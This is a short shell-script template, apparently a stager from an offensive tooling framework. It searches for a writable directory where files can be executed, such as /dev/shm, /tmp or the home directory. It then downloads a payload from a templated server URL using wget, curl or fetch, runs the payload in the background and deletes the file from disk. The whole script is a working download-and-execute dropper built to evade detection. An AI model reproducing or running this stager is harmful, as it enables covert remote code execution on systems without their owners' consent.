#!/bin/sh

# e.g. http://localhost/payload.elf
DOWNLOAD_URL='{{ SRVURL }}'
FILE_NAME=id

for dir in /dev/shm "/run/user/$(id -u)" "$XDG_RUNTIME_DIR" /tmp /var/tmp "$TMPDIR" "$HOME" .; do
    if [ -w "$dir" ]; then
        echo exit > "$dir/$FILE_NAME"
        chmod +x "$dir/$FILE_NAME"
        if "$dir/$FILE_NAME"; then
            break
        fi
    fi
done

wget -O "$dir/$FILE_NAME" "$DOWNLOAD_URL" || \
    curl -o "$dir/$FILE_NAME" "$DOWNLOAD_URL" || \
    fetch -o "$dir/$FILE_NAME" "$DOWNLOAD_URL"

chmod +x "$dir/$FILE_NAME"
"$dir/$FILE_NAME" &
rm -f "$dir/$FILE_NAME"
